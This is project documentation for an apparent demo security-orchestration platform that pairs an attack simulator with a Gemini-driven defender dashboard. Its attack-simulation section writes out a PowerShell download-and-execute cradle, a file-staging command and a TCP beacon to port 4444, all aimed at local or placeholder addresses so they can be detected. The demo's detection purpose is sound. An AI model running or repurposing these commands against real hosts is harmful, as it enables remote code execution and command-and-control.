# SentinelOneX V4.0 - Complete Project Documentation

## 🎯 Executive Summary

**SentinelOneX V4.0** is an AI-powered Security Orchestration, Automation and Response (SOAR) demonstration platform that showcases autonomous threat detection and response using Google Gemini AI models. It simulates a real-world security operations center (SOC) with dual AI agents working together to detect, analyze, and remediate cyber threats in real-time.

---

## 🏗️ Architecture Overview

### **Dual-App Architecture**
The system consists of two independent Streamlit web applications running on separate ports:

1. **🔴 Attacker App (Port 7860)** - Threat simulator
2. **🛡️ Defender App (Port 7861)** - AI-powered defense platform

### **Core Components**

```
┌─────────────────────────────────────────────────────────────────┐
│                    SentinelOneX V4.0 System                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  ┌─────────────────┐                 ┌──────────────────────┐   │
│  │  ATTACKER APP   │────────────────▶│   DEFENDER APP       │   │
│  │  Port 7860      │  Real Threats   │   Port 7861          │   │
│  └─────────────────┘                 └──────────────────────┘   │
│         │                                      │                 │
│         │ Spawns malicious                    │                 │
│         │ processes with                       │                 │
│         │ DETACHED_PROCESS                     │                 │
│         │                                      │                 │
│         ▼                                      ▼                 │
│  ┌─────────────────┐                 ┌──────────────────────┐   │
│  │ Real OS Process │                 │  Sentry Monitor      │   │
│  │ (PowerShell,    │                 │  (Background Thread) │   │
│  │  CMD, etc.)     │                 │  - psutil scanning   │   │
│  └─────────────────┘                 │  - 100ms polling     │   │
│                                      │  - Pattern matching  │   │
│                                      └──────────────────────┘   │
│                                               │                  │
│                                               ▼                  │
│                                      ┌──────────────────────┐   │
│                                      │  Threat Queue        │   │
│                                      │  (Session State)     │   │
│                                      └──────────────────────┘   │
│                                               │                  │
│                                               ▼                  │
│                                      ┌──────────────────────┐   │
│                                      │  Gemini AI Models    │   │
│                                      │  - Flash (Analyst)   │   │
│                                      │  - Pro (Expert)      │   │
│                                      └──────────────────────┘   │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Main Features

### **1. Real-Time Threat Detection**
- **Sentry Monitoring Engine**: Background thread continuously scans running processes
- **100ms Polling Interval**: Near-instant detection of suspicious activity
- **Pattern-Based Detection**: Identifies threats using signature matching
- **Process Tracking**: Prevents duplicate alerts using PID tracking

### **2. Dual-AI Agent System**

#### **V1 Analyst (Gemini-2.0-Flash)**
- **Purpose**: Fast, human-readable threat analysis
- **Speed**: Optimized for quick response
- **Output**: Natural language summaries for SOC analysts
- **Use Case**: Initial triage and alert enrichment

#### **V3 Expert (Gemini-2.0-Pro)**
- **Purpose**: Advanced remediation planning
- **Capability**: Generates structured JSON playbooks
- **Output**: Machine-executable remediation steps
- **Use Case**: Automated response orchestration

### **3. MCP Security Scanner**
- **Model Context Protocol (MCP) Compliance Testing**
- **URL Security Scanning**: Test any web endpoint
- **Automated Vulnerability Detection**
- **Security Scoring**: 0-100 rating system
- **Detailed Reports**: Exportable JSON results

### **4. Session State Management**
- **Streamlit Session Persistence**: Threats survive UI refreshes
- **Thread-Safe Operations**: Lock-based queue management
- **Auto-Refresh**: 0.5-second UI updates for real-time visibility

### **5. Debug & Monitoring Panel**
- **Queue Length Tracking**: Real-time threat count
- **Sentry Status**: Active/inactive monitoring state
- **PID Tracking**: Unique threat identifiers
- **Visual Indicators**: Color-coded status displays

---

## 🎭 Attack Simulation Types

### **1. Fileless Attack (PowerShell Cradle)**
```powershell
powershell.exe -NoP -WindowStyle Hidden "Start-Sleep -Seconds 5; IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/nonexistent-malware.ps1')"
```
- **Technique**: T1059.001 (PowerShell)
- **Detection**: Command line pattern matching
- **Lifespan**: 5 seconds (for detection window)

### **2. Registry Persistence**
```powershell
powershell.exe -NoP "Start-Sleep -Seconds 5; Write-Host windows_update_service"
```
- **Technique**: T1547.001 (Registry Run Keys)
- **Detection**: Suspicious service name patterns
- **Purpose**: Simulates persistence mechanism

### **3. File Staging**
```cmd
cmd.exe /c "echo malicious_payload > %TEMP%\staged_malware.bin && timeout /t 5 /nobreak"
```
- **Technique**: T1105 (Ingress Tool Transfer)
- **Detection**: Malicious file creation patterns
- **Target**: Temporary directory staging

### **4. Network C2 (Command & Control)**
```powershell
powershell.exe -NoP "Start-Sleep -Seconds 5; try { $s = New-Object Net.Sockets.TcpClient; $s.Connect('192.168.1.100', 4444) } catch {}"
```
- **Technique**: T1071.001 (Application Layer Protocol)
- **Detection**: Outbound connection attempts
- **Behavior**: Simulated C2 beacon

---

## 🔧 Technical Implementation

### **Key Technologies**
- **Frontend**: Streamlit 1.50.0
- **AI Models**: Google Gemini 2.0 (Flash + Pro)
- **Process Monitoring**: psutil 7.1.3
- **Threading**: Python threading with Event/Lock
- **Data Structure**: collections.deque (100-item circular buffer)
- **Language**: Python 3.14.0

### **Critical Design Patterns**

#### **1. Streamlit Session State Pattern**
```python
if 'threat_queue' not in st.session_state:
    st.session_state.threat_queue = deque(maxlen=100)
    st.session_state.threat_lock = threading.Lock()
    st.session_state.sentry_active = threading.Event()
    st.session_state.detected_pids = set()
```
**Why**: Prevents data loss during Streamlit's script reruns

#### **2. Detached Process Spawning**
```python
DETACHED_PROCESS = 0x00000008
subprocess.Popen(cmd, shell=True, creationflags=DETACHED_PROCESS)
```
**Why**: Prevents UI freezing and simulates real malware behavior

#### **3. Thread-Safe Queue Operations**
```python
with threat_lock:
    threat_queue.append(threat_data)
```
**Why**: Prevents race conditions between Sentry thread and UI thread

#### **4. Auto-Start Sentry Pattern**
```python
if 'sentry_started' not in st.session_state:
    st.session_state.sentry_started = True
    sentry_active.set()
    threading.Thread(target=sentry_monitor_loop, daemon=True).start()
```
**Why**: Automatic monitoring activation on app launch

---

## 📊 Threat Detection Workflow

```
1. ATTACK LAUNCHED
   ↓
2. Process spawned with DETACHED_PROCESS flag
   ↓
3. Sentry thread scans all processes (100ms interval)
   ↓
4. Pattern matching against threat signatures
   ↓
5. PID checked against detected_pids set
   ↓
6. NEW THREAT → Added to session_state.threat_queue
   ↓
7. UI auto-refreshes (500ms interval)
   ↓
8. Threat displayed in dashboard
   ↓
9. User clicks "Analyze Threat"
   ↓
10. Gemini Flash generates human summary
    ↓
11. (Optional) Gemini Pro generates remediation playbook
    ↓
12. Analyst approves/denies action
    ↓
13. System executes or logs response
```

---

## 🎯 Use Cases & Demo Scenarios

### **Investor Presentations**
- **Live Demo**: Launch attacks in real-time, show AI detection
- **ROI Story**: Automated response vs manual analysis
- **Scalability**: Single platform handling multiple threat types

### **Conference Demos**
- **Dual-Screen Setup**: Attacker on left, Defender on right
- **Narrative**: "Red Team vs Blue Team powered by AI"
- **Interactive**: Audience can suggest attack types

### **Technical Evaluations**
- **Architecture Review**: Show dual-AI agent collaboration
- **Integration Testing**: MCP security scanner for API validation
- **Performance Metrics**: 100ms detection, sub-second AI analysis

---

## 🐛 Bug Fixes Applied (v4.0)

### **Fix #1: Global State Wipe Bug**
- **Problem**: `threat_queue = deque()` reset on every Streamlit rerun
- **Solution**: Migrated to `st.session_state.threat_queue`
- **Impact**: Threats now persist across UI refreshes

### **Fix #2: Auto-Remediation Race Condition**
- **Problem**: `taskkill` executed before UI could display threat
- **Solution**: Disabled auto-kill, manual review only
- **Impact**: Threats visible in UI for analysis

### **Fix #3: Process Lifespan Too Short**
- **Problem**: Attacks died in <100ms, missed by polling
- **Solution**: Added `Start-Sleep -Seconds 5` to all attacks
- **Impact**: Guaranteed detection within polling window

### **Fix #4: MCP Score Type Error**
- **Problem**: `compute_score()` returned string, failed comparison
- **Solution**: Added type conversion `int(score)`
- **Impact**: Security scanner displays proper ratings

---

## 🚦 Quick Start Guide

### **Installation**
```powershell
# Clone repository
git clone https://github.com/isa-aldoy/demo-sentinelonex.git
cd demo-sentinelonex

# Create virtual environment
python -m venv .venv
.venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Set API key
$env:GOOGLE_API_KEY="your-gemini-api-key"
```

### **Launch Demo**
```powershell
# Option 1: Use batch files
START_DEFENDER.bat  # Launches on port 7861
START_ATTACKER.bat  # Launches on port 7860

# Option 2: Manual launch
streamlit run defender_streamlit.py --server.port 7861 --server.headless true
streamlit run attacker_streamlit.py --server.port 7860 --server.headless true
```

### **Access URLs**
- **Defender Dashboard**: http://localhost:7861
- **Attacker Console**: http://localhost:7860

---

## 📁 Project Structure

```
demo-sentinelonex/
├── defender_streamlit.py      # Main defender app (AI + Sentry)
├── attacker_streamlit.py      # Threat simulator app
├── START_DEFENDER.bat         # Windows launcher for defender
├── START_ATTACKER.bat         # Windows launcher for attacker
├── requirements.txt           # Python dependencies
├── v3_api_demo.py            # Original Gradio version (legacy)
├── attack_app.py             # Original Gradio attacker (legacy)
├── mcp_testbench/            # Security scanner module
│   ├── engine.py             # Test execution engine
│   ├── reporter.py           # Score computation
│   └── plugins/              # Security test plugins
├── demo_output/              # Logs and sample outputs
├── README.md                 # Original project README
└── PROJECT_DOCUMENTATION.md  # This file
```

---

## 🔐 Security Considerations

### **Demo-Only Warning**
⚠️ **This is a demonstration platform, NOT production-ready software**

- **Real Process Execution**: Actually spawns malicious-looking processes
- **No Sandboxing**: Runs directly on host OS
- **API Keys**: Hardcoded in demo (use environment variables in production)
- **No Authentication**: Both apps accessible without login
- **Network Exposure**: External URLs shown in terminal output

### **Production Recommendations**
1. **Containerization**: Run in isolated Docker containers
2. **Network Segmentation**: Place behind firewall/VPN
3. **API Key Management**: Use secrets manager (Azure Key Vault, AWS Secrets Manager)
4. **Authentication**: Implement OAuth/SSO
5. **Rate Limiting**: Protect AI endpoints from abuse
6. **Audit Logging**: Track all threat detections and responses

---

## 🎓 Educational Value

### **Learning Objectives**
1. **AI Agent Collaboration**: How multiple models work together
2. **Real-Time Monitoring**: Background thread patterns in web apps
3. **Session State Management**: Handling stateful data in Streamlit
4. **Process Monitoring**: Using psutil for system surveillance
5. **Threat Detection**: Signature-based pattern matching
6. **Security Automation**: SOAR platform fundamentals

### **Key Concepts Demonstrated**
- **Dual-AI Architecture**: Fast analyst + expert planner
- **Event-Driven Monitoring**: Threading with Event/Lock primitives
- **Defensive Coding**: Thread-safe operations, type checking
- **UI/UX Design**: Real-time dashboards, debug panels
- **Security Testing**: MCP compliance scanning

---

## 🔮 Future Enhancements

### **Planned Features**
- [ ] Multi-user support with role-based access
- [ ] Historical threat timeline visualization
- [ ] Machine learning-based anomaly detection
- [ ] Integration with real SIEM platforms (Splunk, Elastic)
- [ ] Custom threat signature editor
- [ ] Automated incident reporting (PDF/email)
- [ ] Kubernetes deployment manifests
- [ ] Threat intelligence feed integration

### **Advanced Capabilities**
- [ ] Behavioral analysis (ML-based)
- [ ] Memory forensics integration
- [ ] Network traffic analysis (packet capture)
- [ ] Container/VM threat detection
- [ ] Multi-cloud security posture management

---

## 📞 Support & Contact

**Project Owner**: isa-aldoy  
**Repository**: https://github.com/isa-aldoy/demo-sentinelonex  
**Version**: 4.0 (Streamlit Migration)  
**License**: MIT  
**Last Updated**: November 4, 2025

---

## 🏆 Key Achievements

✅ **Migrated from Gradio to Streamlit** - Solved Python 3.14 compatibility issues  
✅ **Fixed critical state management bugs** - Threats now persist across reruns  
✅ **Implemented auto-start Sentry** - Zero-configuration monitoring  
✅ **Added MCP security scanner** - URL vulnerability testing  
✅ **Real-time threat detection** - 100ms polling for instant alerts  
✅ **Dual-AI agent system** - Flash for speed, Pro for depth  
✅ **Production-ready debug tools** - Queue tracking, PID monitoring  

---

**SentinelOneX V4.0** - *Where AI meets cybersecurity at the speed of thought.* ⚡🛡️
